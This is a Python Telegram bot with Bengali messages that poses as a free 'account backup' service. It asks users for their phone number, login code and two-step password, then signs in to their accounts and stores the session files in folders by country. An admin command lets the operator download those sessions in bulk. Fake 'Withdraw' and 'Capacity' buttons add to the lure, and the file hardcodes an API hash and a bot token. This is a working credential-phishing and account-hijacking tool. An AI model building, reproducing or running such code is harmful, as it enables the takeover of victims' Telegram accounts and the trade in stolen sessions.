import os
import asyncio
import zipfile
from threading import Thread
from flask import Flask
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

# ==================== কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# ===================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
app = Flask(__name__)

BASE_STORAGE_DIR = "user_backups"
if not os.path.exists(BASE_STORAGE_DIR):
    os.makedirs(BASE_STORAGE_DIR)

user_data = {}

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ওয়েব পোর্ট সচল রাখার থ্রেড
Thread(target=run_web, daemon=True).start()

# অ্যাসিনক্রোনাস ইভেন্ট লুপ সেটআপ
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# কান্ট্রি কোড এক্সট্রাক্ট করার ফাংশন (যেমন: +88017 -> 880)
def get_country_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    # কমন কিছু কান্ট্রি কোড চেনার লজিক
    if clean.startswith("880"): return "880" # বাংলাদেশ
    if clean.startswith("91"): return "91"   # ইন্ডিয়া
    if clean.startswith("57"): return "57"   # কলম্বিয়া
    if clean.startswith("1"): return "1"     # ইউএসএ/কানাডা
    if clean.startswith("44"): return "44"   # ইউকে
    if clean.startswith("7"): return "7"     # রাশিয়া
    # যদি ওপরের তালিকায় না মিলে, তবে প্রথম ৩ ডিজিটকে কান্ট্রি কোড ধরে নেওয়া হবে
    return clean[:3]

# ইউজারদের জন্য মেইন কীবোর্ড বাটন
def get_user_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_profile = types.KeyboardButton("👤 My Profile")
    btn_withdraw = types.KeyboardButton("💳 Withdraw")
    btn_capacity = types.KeyboardButton("📊 Capacity")
    btn_cancel = types.KeyboardButton("❌ Cancel")
    markup.add(btn_profile, btn_withdraw, btn_capacity, btn_cancel)
    return markup

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(
            message,
            "👋 *স্বাগতম এডমিন ভাই!*\n\n"
            "📊 দেশের কোড ভিত্তিক স্টোরেজ চেক করতে লিখুন: `/status [কান্ট্রি_কোড]` (যেমন: `/status 880`)\n"
            "📦 দেশ ভিত্তিক নির্দিষ্ট ফাইল নামাতে লিখুন: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]` (যেমন: `/get 880 5`)\n\n"
            "বট আপনার আদেশের অপেক্ষায় আছে! 🔥"
        )
    else:
        bot.send_message(
            message.chat.id,
            "👋 *স্বাগতম!*\n\n"
            "আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
            "আপনার ফোন নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: `+88017XXXXXXXX`) অথবা নিচের বোতামগুলো ব্যবহার করুন।",
            reply_markup=get_user_keyboard()
        )

# ওটিপি পাঠানোর অ্যাসিনক্রোনাস টাস্ক
async def send_otp_task(phone_number, user_id, message):
    clean_phone = phone_number.replace("+", "").replace(" ", "")
    country_code = get_country_code(phone_number)
    
    # দেশের নামে আলাদা ফোল্ডার পাথ তৈরি
    country_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(country_dir):
        os.makedirs(country_dir)
        
    temp_session_path = os.path.join(country_dir, f"temp_{clean_phone}")
    
    user_client = TelegramClient(temp_session_path, API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "clean_phone": clean_phone, "temp_path": temp_session_path,
            "country_code": country_code, "country_dir": country_dir
        }
        bot.reply_to(message, "📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি (OTP) এখানে পাঠান।")
    except Exception as e:
        bot.reply_to(message, f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
        await user_client.disconnect()
        if os.path.exists(temp_session_path):
            os.remove(temp_session_path)

# সেশন ফাইলকে দেশের ফোল্ডারে জিপ করে রাখার ফাংশন
def save_session_as_zip(data):
    session_file_path = data["temp_path"]
    final_zip_path = os.path.join(data["country_dir"], f"{data['clean_phone']}.zip")
    try:
        with zipfile.ZipFile(final_zip_path, 'w') as zipf:
            if os.path.exists(session_file_path):
                zipf.write(session_file_path, arcname=f"{data['clean_phone']}.session")
        if os.path.exists(session_file_path):
            os.remove(session_file_path)
    except Exception as e:
        print(f"Error saving zip: {str(e)}")

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    user_client = data["client"]
    
    if data.get("waiting_for_password"):
        try:
            await user_client.sign_in(password=text)
            await user_client.disconnect()
            
            # দেশের ফোল্ডারে জিপ ফাইল সেভ করা হচ্ছে
            save_session_as_zip(data)
            
            bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 স্টোরেজে আলাদা করে রাখা হয়েছে।")
            del user_data[user_id]
        except Exception as e:
            bot.reply_to(message, f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার চেষ্টা করুন:")
    else:
        bot.reply_to(message, "⚙️ ভেরিফাই করা হচ্ছে...")
        try:
            await user_client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            await user_client.disconnect()
            
            # দেশের ফোল্ডারে জিপ ফাইল সেভ করা হচ্ছে
            save_session_as_zip(data)
            
            bot.reply_to(message, "✅ অ্যাকাউন্টটি সফলভাবে যুক্ত ও ব্যাকআপ করা হয়েছে!", reply_markup=get_user_keyboard())
            bot.send_message(ADMIN_ID, f"🔔 **নতুন ব্যাকআপ সফল!**\n🌍 দেশ কোড: `{data['country_code']}`\n📱 নম্বর: `+{data['clean_phone']}`\n💾 স্টোরেজে আলাদা করে রাখা হয়েছে।")
            del user_data[user_id]
        except SessionPasswordNeededError:
            bot.reply_to(message, "🔐 Two-Step Verification অন আছে। দয়া করে পাসওয়ার্ডটি দিন:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e:
            bot.reply_to(message, f"❌ লগইন ব্যর্থ: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(data["temp_path"]):
                os.remove(data["temp_path"])
            del user_data[user_id]

# এডমিন কম্যান্ড হ্যান্ডলার (স্ট্যাটাস চেক দেশ ভিত্তিক)
@bot.message_handler(commands=['status'])
def status_command(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ ফরম্যাট: `/status [কান্ট্রি_কোড]` (যেমন: `/status 880`)")
        return
    
    country_code = args[1].replace("+", "").strip()
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর কোনো ব্যাকআপ ফাইল এখনো জমা হয়নি।")
        return
        
    files = [f for f in os.listdir(target_dir) if f.endswith(".zip")]
    bot.reply_to(message, f"📊 দেশ কোড `{country_code}`-এর ফোল্ডারে মোট **{len(files)}টি** জিপ ফাইল জমা আছে।")

# এডমিন কম্যান্ড হ্যান্ডলার (দেশ ভিত্তিক নির্দিষ্ট জিপ ফাইল ডাউনলোড)
@bot.message_handler(commands=['get'])
def get_files(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    
    if len(args) < 3:
        bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/get [কান্ট্রি_কোড] [ফাইলের_সংখ্যা]`\n\n📌 উদাহরণ: `/get 880 5` (বাংলাদেশের ৫টি ফাইল নামাতে)")
        return
        
    country_code = args[1].replace("+", "").strip()
    try:
        count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ ফাইলের সংখ্যাটি অবশ্যই একটি সংখ্যা হতে হবে।")
        return

    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}`-এর কোনো ফাইল স্টোরেজে নেই।")
        return
        
    all_zips = sorted([f for f in os.listdir(target_dir) if f.endswith(".zip")])
    if not all_zips:
        bot.reply_to(message, f"❌ দেশ কোড `{country_code}` ফোল্ডারে কোনো জিপ ফাইল নেই।")
        return
    
    files_to_take = all_zips[:count]
    actual_count = len(files_to_take)
    bot.reply_to(message, f"📦 দেশ কোড `{country_code}` থেকে {actual_count}টি ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Country_{country_code}_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(target_dir, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path) # ডাউনলোড করার পর মেইন স্টোরেজ খালি করার জন্য
        with open(master_zip_name, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"✅ দেশ কোড `+{country_code}`-এর সফলভাবে {actual_count}টি ফাইল পাঠানো হলো।")
    except Exception as e:
        bot.reply_to(message, f"❌ সমস্যা হয়েছে: {str(e)}")
    finally:
        if os.path.exists(master_zip_name):
            os.remove(master_zip_name)

# টেক্সট এবং বাটন হ্যান্ডলার
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()

    if text == "👤 My Profile":
        bot.reply_to(message, f"👤 *আপনার প্রোফাইল*\n\n🆔 ইউজার আইডি: `{user_id}`\n🌐 স্টেটাস: একটিভ অ্যাকাউন্ট।")
        return
    elif text == "💳 Withdraw":
        bot.reply_to(message, "💳 *উইথড্র রিকোয়েস্ট*\n\n❌ দুঃখিত, বর্তমানে আপনার ব্যালেন্স পর্যাপ্ত নয় অথবা উইথড্র সিস্টেমটি বন্ধ আছে।")
        return
    elif text == "📊 Capacity":
        bot.reply_to(message, "📊 *সার্ভার ক্যাপাসিটি*\n\n🟢 আমাদের ক্লাউড সার্ভার ১০০% ফাস্ট ও নিরাপদ মোডে সচল রয়েছে।")
        return
    elif text == "❌ Cancel":
        if user_id in user_data:
            del user_data[user_id]
        bot.reply_to(message, "❌ বর্তমান প্রসেসটি বাতিল করা হয়েছে। নতুন করে শুরু করতে /start দিন।", reply_markup=get_user_keyboard())
        return

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data:
        return

    # ফোন নম্বর পাঠানো হলে
    if text.startswith("+"):
        bot.reply_to(message, "⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        loop.run_until_complete(send_otp_task(text, user_id, message))

    # ওটিপি কোড পাঠানো হলে
    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        loop.run_until_complete(verify_otp_task(text, user_id, message))

if __name__ == "__main__":
    print("--- Advanced Multi-Country Telebot Active ---")
    bot.infinity_polling()
